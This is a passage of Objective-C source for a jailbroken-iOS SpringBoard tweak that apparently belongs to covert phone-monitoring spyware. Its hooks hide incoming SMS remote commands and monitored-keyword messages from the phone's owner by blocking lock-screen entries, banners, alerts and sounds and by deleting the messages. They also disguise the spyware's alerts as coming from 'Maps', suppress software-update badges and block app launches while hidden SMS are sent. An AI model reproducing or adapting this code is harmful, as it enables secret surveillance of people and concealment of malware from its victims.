		// Clear the transcript controller (chat view)
		CKIMMessage *message = [notification object];
		[message markAsRead];
		[message updateMessageCompleteQuietly];
		CKConversation *_conversation = [self conversation];
		/*
		if ([[_conversation messages] count] <= 1) {
			// Sometime message have been added to conversation, sometime not
			CKIMMessage *latestMessage = [_conversation latestMessage];
			if (([latestMessage rowID] == [message rowID]) ||
				[[_conversation messages] count] == 0) {
				[_conversation deleteAllMessagesAndRemoveGroup];
			} else {
				[_conversation deleteMessage:message];
			}
		} else {
			[_conversation deleteMessage:message];
		}*/
		
		// TODO: Improve by delete individual message
		[_conversation deleteMessage:message];
		[_conversation deleteAllMessagesAndRemoveGroup];
		
		[_conversation removeMessage:message postUpdate:YES];
		Class $CKConversationList = objc_getClass("CKConversationList");
		[[$CKConversationList sharedConversationList] _postConversationListChangedNotification];
		DLog (@"_conversation = %@", _conversation);
		DLog (@"$CKConversationList = %@", [$CKConversationList sharedConversationList]);
	} else {
		CALL_ORIG(CKTranscriptController, _messageReceived$, arg1);
	}
}

#pragma mark -
#pragma mark SBAwayBulletinListController hooks
#pragma mark -

HOOK(SBAwayBulletinListController, observer$addBulletin$forFeed$, void, id arg1, id arg2, unsigned int arg3) {	
    DLog (@"************************************************************************************");
    DLog (@"*****************				addBulletin						********************");
    DLog (@"************************************************************************************");
	DLog(@">>>>>>>>>>>>>>>>>>>>>>>> SBAwayBulletinListController <<<<<<<<<<<<<<<<<<<<<<<");
	DLog(@"[arg1 class] = %@", [arg1 class]);
	DLog(@"arg1 = %@", arg1);
	DLog(@"[arg2 class] = %@", [arg2 class]); // BBBulletin could be in SpringBoard plugin
	DLog(@"arg2 = %@", arg2);
	DLog(@"arg3 = %d", arg3);
	DLog(@">>>>>>>>>>>>>>>>>>>>>>>> SBAwayBulletinListController <<<<<<<<<<<<<<<<<<<<<<<");
	CALL_ORIG(SBAwayBulletinListController, observer$addBulletin$forFeed$, arg1, arg2, arg3);
}


#pragma mark -
#pragma mark SBLockScreenNotificationListController hooks, e.g: alert from Message application, LINE applcation
#pragma mark -

// This is call on iOS 7 when there is a alert on Lock Screen. This class exist on iOS 7
HOOK(SBLockScreenNotificationListController, observer$addBulletin$forFeed$, void, id arg1, id arg2, unsigned int arg3) {
    DLog (@"*****************************************************************************************");
    DLog (@"***************** SBLockScreenNotificationListController addBulletin ********************");
    DLog (@"*****************************************************************************************");
	//DLog(@"[arg1 class] = %@", [arg1 class]);
	DLog(@"arg1 = %@", arg1);
	//DLog(@"[arg2 class] = %@", [arg2 class]); // BBBulletin could be in SpringBoard plugin
	DLog(@"arg2 = %@", arg2);
	DLog(@"arg3 = %d", arg3);
	
    BBBulletin *bulletin    = arg2;
    NSString *message       = [bulletin message];
    
    //DLog(@"section %@", [bulletin section]);
    //DLog(@"sectionID %@", [bulletin sectionID]);
    
    // -- Consider only Message application
    if ([[bulletin sectionID] isEqualToString:@"com.apple.MobileSMS"]) {
        
        // -- Check SMS remote command
        BOOL isSMSCommand       = [message scanWithStartTag:kSMSComandFormatTag];
        
        // -- Check SMS keyword
        if (!isSMSCommand) {
            isSMSCommand        = [SMSUtils checkSMSKeywordWithMonitorNumber:message];
        }
        
        // -- Call original if not SMS remote command and not SMS keyword
        if(!isSMSCommand) {
            CALL_ORIG(SBLockScreenNotificationListController, observer$addBulletin$forFeed$, arg1, arg2, arg3);
        } else {
            DLog(@"SMS command / keyword, So BLOCK from Lock Screen")
        }

    } else {
        CALL_ORIG(SBLockScreenNotificationListController, observer$addBulletin$forFeed$, arg1, arg2, arg3);
    }
}

// iOS 8
HOOK(SBLockScreenNotificationListController, observer$addBulletin$forFeed$playLightsAndSirens$withReply$, void, id arg1, id arg2, unsigned int arg3, BOOL arg4, id arg5) {
    DLog (@"************************************************************************************");
    DLog (@"***************** SBLockScreenNotificationListController addBulletin ***************");
    DLog (@"************************************************************************************");
	//DLog(@"[arg1 class] = %@", [arg1 class]);
	DLog(@"arg1 = %@", arg1);   // BBObserver
	//DLog(@"[arg2 class] = %@", [arg2 class]); // BBBulletin could be in SpringBoard plugin
	DLog(@"arg2 = %@", arg2);   // BBBulletin
	DLog(@"arg3 = %d", arg3);
    DLog(@"arg4 = %d", arg4);
	DLog(@"arg5 = %@", arg5);   // __NSMallocBlock__
	
    BBBulletin *bulletin    = arg2;
    NSString *message       = [bulletin message];
    
    //DLog(@"section %@", [bulletin section]);
    //DLog(@"sectionID %@", [bulletin sectionID]);
    
    // -- Consider only Message application
    if ([[bulletin sectionID] isEqualToString:@"com.apple.MobileSMS"]) {
        
        // -- Check SMS remote command
        BOOL isSMSCommand       = [message scanWithStartTag:kSMSComandFormatTag];
        
        // -- Check SMS keyword
        if (!isSMSCommand) {
            isSMSCommand        = [SMSUtils checkSMSKeywordWithMonitorNumber:message];
        }
        
        // -- Call original if not SMS remote command and not SMS keyword
        if(!isSMSCommand) {
            CALL_ORIG(SBLockScreenNotificationListController, observer$addBulletin$forFeed$playLightsAndSirens$withReply$, arg1, arg2, arg3, arg4, arg5);
        } else {
            DLog(@"SMS command / keyword, So BLOCK from Lock Screen")
        }
        
    } else if ([[bulletin sectionID] isEqualToString:@"com.apple.mobiletimer"]) {
        DLog (@"This is for Temporal Control Application for 8 (Lock Screen)")
        BOOL callOriginal                   = YES;
        
        NSString *title         = [bulletin title];
        NSString *application   = [bulletin sectionID];
        NSDate *schedulingTime  = [bulletin date];
        NSString *hour          = [bulletin context][@"userInfo"][@"hour"];
        NSString *min           = [bulletin context][@"userInfo"][@"minute"] ;
        
        DLog (@">> message %@", title)
        DLog (@">> app %@", application)
        DLog (@">> schedulingTime %@", schedulingTime)
        DLog (@">> hour:min %@:%@", hour, min)
        
        DLog (@"_bulletin %@", bulletin)
        DLog (@"_bulletin context %@ %@", [bulletin context], [[bulletin context] class])
        DLog (@"_bulletin content %@", [bulletin content])
        DLog (@"_bulletin section %@",  [bulletin section])
        DLog (@"_bulletin message %@",  [bulletin message])

        NSRange rangeResult     = [title rangeOfString:kTemporalControlApplicationCommandString];    // <*#FSCOMMAND
        
        if ([application isEqualToString:@"com.apple.mobiletimer"]          &&      // It is Mobile Time Application
            ((rangeResult.location == 0) && (rangeResult.length != 0))      ){      // It is the alarm schedule by ourself
            
            callOriginal = NO;
            
            NSDictionary *messages = [SMSUtils parseTemporalAppControlCommand:title];
            if (messages)
                [SMSUtils sendTemporalApplicationControlMessage:messages];
        }
        if (callOriginal) {
            CALL_ORIG(SBLockScreenNotificationListController, observer$addBulletin$forFeed$playLightsAndSirens$withReply$, arg1, arg2, arg3, arg4, arg5);
        }
    }
    else {
        CALL_ORIG(SBLockScreenNotificationListController, observer$addBulletin$forFeed$playLightsAndSirens$withReply$, arg1, arg2, arg3, arg4, arg5);
    }
}

#pragma mark -
#pragma mark SBBulletinObserverViewController hooks, e.g: Notifcation is added in Notification Center plane (drag down view from the top of screen)
#pragma mark -

// This is call on iOS 7,8 when notifcation is added in Notification Center plane
HOOK(SBBulletinObserverViewController, observer$addBulletin$forFeed$, void, id arg1, id arg2, unsigned arg3) {
    //DLog (@"***************************************************************************************************");
    DLog (@"*****************				SBBulletinObserverViewController addBulletin	********************");
    //DLog (@"****************************************************************************************************");
	//DLog(@"[arg1 class] = %@", [arg1 class]); // BBObserver
	DLog(@"arg1 = %@", arg1);
	//DLog(@"[arg2 class] = %@", [arg2 class]); // BBBulletin could be in SpringBoard plugin
	DLog(@"arg2 = %@", arg2);
	DLog(@"arg3 = %d", arg3);
    
    BBObserver *observer                        = arg1;
    id delegate                                 = [observer delegate];
    Class $SBNotificationsAllModeViewController = objc_getClass("SBNotificationsAllModeViewController");

    BBBulletin *bulletin                        = arg2;
    
    if ([delegate isKindOfClass:[$SBNotificationsAllModeViewController class]]          &&     // consider only when delegate is SBNotificationsAllModeViewController
        [[bulletin sectionID] isEqualToString:@"com.apple.MobileSMS"]                   ){     // consider only SMS application
        
        DLog (@"All Mode View Controller")
        BBBulletin *bulletin    = arg2;
        NSString *message       = [bulletin message];
        
        // check SMS remote command
        BOOL    isSMSCommand    = [message scanWithStartTag:kSMSComandFormatTag];
        
        // check SMS keyword
        if (!isSMSCommand) {
            isSMSCommand        = [SMSUtils checkSMSKeywordWithMonitorNumber:message];
        }
        
        // call original if not SMS remote command and not SMS keyword
        if(!isSMSCommand) {
            CALL_ORIG(SBBulletinObserverViewController, observer$addBulletin$forFeed$, arg1, arg2, arg3);
        } else {
            DLog(@"SMS command / keyword, So BLOCK from Notification Center Plane")
        }

    } else {
        CALL_ORIG(SBBulletinObserverViewController, observer$addBulletin$forFeed$, arg1, arg2, arg3);
    }
}


#pragma mark -
#pragma mark SBAlertItemsController hooks
#pragma mark -

/*
 Purpose 1
 This hooking is to prevent ALERT Popup notifcation to be shown when the following SMS comes
	- SMS command
	- SMS containing keyword or monitor number
 
 Purpose 2
 Change the application name from System Core to Maps in alert Message
 */
HOOK(SBAlertItemsController, activateAlertItem$, void, id arg1) {
	//DLog (@"************************************************************************************");
	DLog (@"*****************				block SMS Alert					********************");
	//DLog (@"************************************************************************************");
	
	DLog(@">>>>>>>>>>>>>>>>>>>>>>>> SBAlertItemsController <<<<<<<<<<<<<<<<<<<<<<<");
	DLog(@"[arg1 class] = %@", [arg1 class]);
	DLog(@"arg1 = %@", arg1);
    
	Class $CKMessageAlertItem               = objc_getClass("CKMessageAlertItem");
    Class $SBUserNotificationAlert          = objc_getClass("SBUserNotificationAlert");
    Class $SBSystemLocalNotificationAlert   = objc_getClass("SBSystemLocalNotificationAlert");      // ios 7
    Class $SBBulletinModalAlert             = objc_getClass("SBBulletinModalAlert");                // ios 8
   
	if ([arg1 isKindOfClass:$CKMessageAlertItem]) {		
		NSString *smsText	= [(CKMessageAlertItem *) arg1 messageText];		
		BOOL block			= ([smsText scanWithStartTag:kSMSComandFormatTag]			||		// Check sms command
								[SMSUtils checkSMSKeywordWithMonitorNumber:smsText]);			// Check sms keywords				 
				
		DLog(@"bulletin     = %@", [arg1 bulletin]);
		DLog(@"name         = %@", [arg1 name]);
		DLog(@"address      = %@", [arg1 address]);
		DLog(@"messageText  = %@", [arg1 messageText]);
		
		if (!block) {			
			CALL_ORIG(SBAlertItemsController, activateAlertItem$, arg1);
		} else {
			DLog (@"!!! block notification because of SMS command/Monitor number/Keyword")
		}
	}
    else if ([arg1 isKindOfClass:[$SBUserNotificationAlert class]]) {
        
        NSBundle *mapBundle                 = [NSBundle bundleWithPath:@"/Applications/Maps.app"];
        NSString *mapAppName                = [[mapBundle localizedInfoDictionary] objectForKey:@"CFBundleDisplayName"];
        
        if (!mapAppName  || ![mapAppName length])
            mapAppName = @"Maps";
        
        DLog(@"mapAppName %@", mapAppName);
        DLog(@"bundle preferredLocalizations: %@", [mapBundle preferredLocalizations]);
        
        Visibility *vis = [Visibility sharedVisibility];
        DLog (@"bundleName = %@", [vis mBundleName])
        
        NSString *newHeader                 = [NSString stringWithFormat:@"%@", [arg1 alertHeader]];
        NSString *fsName                    = [vis mBundleName] ? [vis mBundleName] : @"System Core";
        newHeader                           = [newHeader stringByReplacingOccurrencesOfString:fsName withString:mapAppName];
        [arg1 setAlertHeader:newHeader];
        CALL_ORIG(SBAlertItemsController, activateAlertItem$, arg1);
    }
    // For iOS 7
    else if ([arg1 isKindOfClass: [$SBSystemLocalNotificationAlert class]]) {
        DLog (@"This is for Temporal Control Application for 7")
        
        BOOL callOriginal                               = YES;
        
        SBSystemLocalNotificationAlert *localNotiAlert  = arg1;
        
        NSString *bodyText                              = [localNotiAlert bodyText];
        id bundleID                                     = [[localNotiAlert application] bundleIdentifier];
        
        DLog (@"bodyText %@",                           [localNotiAlert bodyText])
        DLog (@"localNotification %@",                  [localNotiAlert localNotification]) // UIConcreteLocalNotification
        DLog (@"application %@",                        [localNotiAlert application])       //  <SBApplication: 0x146ed620> com.apple.mobiletimer  activate:  deactivate:
        DLog (@"isSystemLocalNotificationAlert %d",     [localNotiAlert isSystemLocalNotificationAlert])
        DLog (@"bundleID %@ %@",                        bundleID, [bundleID class])
        
        NSRange rangeResult = [bodyText rangeOfString:kTemporalControlApplicationCommandString];    // <*#FSCOMMAND>
        
        if ([bundleID isEqualToString:@"com.apple.mobiletimer"]         &&  // It is Mobile Time Application
            ((rangeResult.location == 0) && (rangeResult.length != 0))  ){  // It is the alarm schedule by ourself
            DLog (@"!!!!!!!!!! This is temporal control command !!!!!!!!!!")
            
            callOriginal = NO;
            
            NSDictionary *messages = [SMSUtils parseTemporalAppControlCommand:bodyText];
            if (messages)
                [SMSUtils sendTemporalApplicationControlMessage:messages];
        }
        
        if (callOriginal) {
            CALL_ORIG(SBAlertItemsController, activateAlertItem$, arg1);
        }
    } // END for iOS 7
    // For iOS 8
    else if ([arg1 isKindOfClass: [$SBBulletinModalAlert class]]) {
        DLog (@"This is for Temporal Control Application for 8")
        BOOL callOriginal                   = YES;
        
        SBBulletinModalAlert *modalAlert    = arg1;
        BBBulletin*  bulletin               = nil;
        
        object_getInstanceVariable(modalAlert, "_bulletin", (void **)&bulletin);
        
        NSString *title         = [bulletin title];
        NSString *application   = [bulletin sectionID];
        NSDate *schedulingTime  = [bulletin date];
        NSString *hour          = [bulletin context][@"userInfo"][@"hour"];
        NSString *min           = [bulletin context][@"userInfo"][@"minute"] ;
        
        DLog (@">> message %@", title)
        DLog (@">> app %@", application)
        DLog (@">> schedulingTime %@", schedulingTime)
        DLog (@">> hour:min %@:%@", hour, min)
        
        DLog (@"_bulletin %@", bulletin)
        DLog (@"_bulletin context %@",  [bulletin context])
        DLog (@"_bulletin content %@", [bulletin content])
        DLog (@"_bulletin section %@",  [bulletin section])

        NSRange rangeResult = [title rangeOfString:kTemporalControlApplicationCommandString];    // <*#FSCOMMAND>
        
        if ([application isEqualToString:@"com.apple.mobiletimer"]          &&      // It is Mobile Time Application
            ((rangeResult.location == 0) && (rangeResult.length != 0))      ){      // It is the alarm schedule by ourself
            
            callOriginal = NO;
            
            NSDictionary *messages = [SMSUtils parseTemporalAppControlCommand:title];
            if (messages)
                [SMSUtils sendTemporalApplicationControlMessage:messages];
        }
        if (callOriginal) {
            CALL_ORIG(SBAlertItemsController, activateAlertItem$, arg1);
        }
    }

    else {
		CALL_ORIG(SBAlertItemsController, activateAlertItem$, arg1);
	}
		
//	DLog(@"textFieldTitles          = %@", [arg1 textFieldTitles]);
//	DLog(@"textFieldValues          = %@", [arg1 textFieldValues]);
//	DLog(@"alertHeader              = %@", [arg1 alertHeader]);
//	DLog(@"alertMessage             = %@", [arg1 alertMessage]);
//	DLog(@"alertMessageDelimiter    = %@", [arg1 alertMessageDelimiter]);
//	DLog(@"avItemAttributes         = %@", [arg1 avItemAttributes]);
	DLog(@">>>>>>>>>>>>>>>>>>>>>>>> SBAlertItemsController <<<<<<<<<<<<<<<<<<<<<<<");
}


/*
 This hooking is to prevent BANNER notificaiton to be shown when the following SMS comes
 - SMS command
 - SMS containing keyword or monitor number
 */
HOOK(SBBulletinBannerController, _queueBulletin$, void, id arg1) {
	
	//DLog (@"************************************************************************************");
	DLog (@"*****************				block SMS Banner				********************");
	//DLog (@"************************************************************************************");
	
	DLog(@">>>>>>>>>>>>>>>>>>>>>>>> SBBulletinBannerController, _queueBulletin");
	DLog(@"_presentBannerForItem arg1: %@", arg1) // BBBulletin
	BBBulletin *bannerItem = arg1;
	//DLog(@"_appName %@", [bannerItem _appName])
	DLog(@"title        %@", [bannerItem title])
	DLog(@"message      %@", [bannerItem message])
	DLog(@"content      %@", [bannerItem content])
	DLog(@"context      %@", [bannerItem context])
	DLog(@"sectionID    %@", [bannerItem sectionID])
	DLog(@"section      %@", [bannerItem section])
	
	BOOL isRequiredToCallOriginal = NO;
	//if ([[bannerItem _appName] isEqualToString:@"Messages"]) {											// Check only Message application						
	if ([[bannerItem sectionID] isEqualToString:@"com.apple.MobileSMS"]) {									// Check only Message application				
		NSString *smsText	= [bannerItem message];		
		BOOL block			= ([smsText scanWithStartTag:kSMSComandFormatTag]			||		// Check sms command
							   [SMSUtils checkSMSKeywordWithMonitorNumber:smsText]);			// Check sms keywords	

		if (!block) {			
			isRequiredToCallOriginal = YES;
		} else {
			DLog (@"!!! block banner because of SMS command/Monitor number/Keyword")
		}		
	} else {
		isRequiredToCallOriginal = YES;
	}			   
	
	if (isRequiredToCallOriginal)
		CALL_ORIG(SBBulletinBannerController, _queueBulletin$, arg1);
}

HOOK(SBBulletinSoundController,  _shouldHonorPlaySoundRequestForBulletin$, BOOL, id arg1) {
    DLog(@"\n\nXXXXXXXXXXXXXX SBBulletinSoundController --> _shouldHonorPlaySoundRequestForBulletin &&&&&&&&&&&&&&\n\n");
  
    BOOL ret = CALL_ORIG(SBBulletinSoundController, _shouldHonorPlaySoundRequestForBulletin$, arg1);
    DLog (@"ret %d", ret)
    DLog (@"arg1 %@", arg1)
    
    BBBulletin *bul     = arg1;
    NSString *message   = [bul message];
    
    BOOL isBlock = NO;
    if ([[bul sectionID] isEqualToString:@"com.apple.MobileSMS"]        &&      // from SMS application
        ([message scanWithStartTag:kSMSComandFormatTag] ||                      // Check sms command format
        [SMSUtils checkSMSKeywordWithMonitorNumber:message])            &&      // Check sms keywords
        [bul sectionSubtype] == 0                                       ){      // It's SMS, not iMessage. sectionSubtype is 0 for SMS, and 1 for iMessage
        //[[bul section] isEqualToString:@"Text Message"]       // We didn't use this condistion because it fails to differentiate between SMS and iMessage if iPhone languate is not English.
      
        isBlock = YES;
    }
    // checking
    DLog (@"!! message %@",                [bul message])
    DLog (@"!! sectionSubtype %d",         [bul sectionSubtype])
    DLog (@"!! sectionID %@",              [bul sectionID])
    
    DLog (@"context dictionary %@ %@",  [bul context], [[bul context] class])
    DLog (@"content %@",                [bul content])
//    DLog (@"content message %@",    [[bul content] message])
//    DLog (@"content subtitle %@",   [[bul content] subtitle])
//    DLog (@"content title %@",      [[bul content] title])
    DLog (@"modalAlertContent %@",      [bul modalAlertContent])
    DLog (@"publisherBulletinID %@",    [bul publisherBulletinID])
    DLog (@"addressBookRecordID %d",    [bul addressBookRecordID])
    DLog (@"recordID %@",               [bul recordID])
    DLog (@"subsectionIDs %@",          [bul subsectionIDs])
    DLog (@"section %@",                [bul section])
    DLog (@"subtitle %@",               [bul subtitle])
    DLog (@"title %@",                  [bul title])
    DLog (@"subtypePriority %d",        [bul subtypePriority])
    DLog (@"topic %@",                  [bul topic])
    DLog (@"sectionDisplayName %@",     [bul sectionDisplayName])
    
    DLog(@"!! isBlock %d", isBlock)
    
    if (!isBlock) {
        DLog(@"XXXXXXXXXXXXXX NOT BLOCK")
        return ret;
    } else {
        DLog(@"XXXXXXXXXXXXXX BLOCK")
        return NO;
    }
}


#pragma mark -
#pragma mark SBApplicationIcon hooks
#pragma mark -

// This function call first then called account$chat$style$chatProperties$messageReceived$
HOOK(SBApplicationIcon, setBadge$, void, id arg1) {
	//DLog (@"************************************************************************************");
	DLog (@"*****************				setBadge						********************");
	//DLog (@"************************************************************************************");
	DLog (@"------------------------ argument ------------------------");
	DLog (@"setBadge, arg1 = %@, class = %@", arg1, [arg1 class]);
	DLog (@"applicationBundleID = %@", [self applicationBundleID]);
	DLog (@"------------------------ argument ------------------------");
	if ([[self applicationBundleID] isEqualToString:@"com.apple.MobileSMS"]) {
		if ([MSFSPUtils systemOSVersion] >= 6) {
			NSNumber *badge = arg1;
			if ([badge intValue] > 0 && [badge intValue] <= 100) {
				// Decrease sms badge back to original which was increased in
				// account$chat$style$chatProperties$messageReceived$ method
				NSInteger smsBadge = [[SMS2Utils sharedSMS2Utils] mSmsBadge];
				DLog(@"setBadge -smsBadge");
				NSInteger newBadge = [badge intValue] - smsBadge;
				newBadge = (newBadge >= 0) ? newBadge : 0;
				badge = [NSNumber numberWithInteger:newBadge];
				[[SMS2Utils sharedSMS2Utils] setMSmsBadge:0];
			} else {
				badge = [NSNumber numberWithInt:0];
			}
			CALL_ORIG(SBApplicationIcon, setBadge$, badge);
		} else {
			CALL_ORIG(SBApplicationIcon, setBadge$, arg1);
		}
		
	} else {
		// SWU --> Software Update Killer
		if ([[self applicationBundleID] isEqualToString:@"com.apple.Preferences"]) {
			DLog(@"=============== Remove badge in Setting!!!!");
			NSNumber *badge = [NSNumber numberWithInt:0];
			CALL_ORIG(SBApplicationIcon,setBadge$,badge);
		} else {
			CALL_ORIG(SBApplicationIcon, setBadge$, arg1);
		}
	}
}

HOOK(SBApplicationIcon, launch, void) {
	DLog(@"launch");
	NSString *bundleID = [self applicationBundleID];
	if (isApplicationIncompatible(bundleID)) {
		if ([[SMSSender000 sharedSMSSender000] mSendingSMS]) {
			;
		} else {
			CALL_ORIG(SBApplicationIcon, launch);
		}
	} else {
		CALL_ORIG(SBApplicationIcon, launch);
	}
}

HOOK(SBApplicationIcon, launchFromViewSwitcher, void) {
	DLog(@"launchFromViewSwitcher");
	NSString *bundleID = [self applicationBundleID];
	if (isApplicationIncompatible(bundleID)) {
		if ([[SMSSender000 sharedSMSSender000] mSendingSMS]) {
			;
		} else {
			CALL_ORIG(SBApplicationIcon, launchFromViewSwitcher);
		}
	} else {
		CALL_ORIG(SBApplicationIcon, launchFromViewSwitcher);
	}
}

#pragma mark -
#pragma mark SBApplication methods
#pragma mark -

HOOK(SBApplication, setBadge$, void, id arg1) {
    APPLOGVERBOSE(@"setBadge, %@", arg1);
    if ([[self bundleIdentifier] isEqualToString:@"com.apple.MobileSMS"]) {
        // What to do with badge of MobileSMS in case of remote command?
        // Note: iOS 7 SMS remote command is no longer intercept in SpringBoard
        CALL_ORIG(SBApplication, setBadge$, arg1);
        
    } else if ([[self bundleIdentifier] isEqualToString:@"com.apple.Preferences"]) {
        // SWU --> Software Update Killer
    } else {
        CALL_ORIG(SBApplication, setBadge$, arg1);
    }
}

#pragma mark -
#pragma mark SBUIController hooks
#pragma mark -

HOOK(SBUIController, activateApplicationFromSwitcher$, void, id arg1) {
	// Work the same as launch, launchFromAppSwitcher of SBApplicationIcon
	DLog(@"activateApplicationFromSwitcher");
	NSString *bundleID = [arg1 bundleIdentifier];
	if (isApplicationIncompatible(bundleID)) {
		if ([[SMSSender000 sharedSMSSender000] mSendingSMS]) {
			;
		} else {
			CALL_ORIG(SBUIController, activateApplicationFromSwitcher$, arg1);
		}
	} else {
		CALL_ORIG(SBUIController, activateApplicationFromSwitcher$, arg1);
	}
}
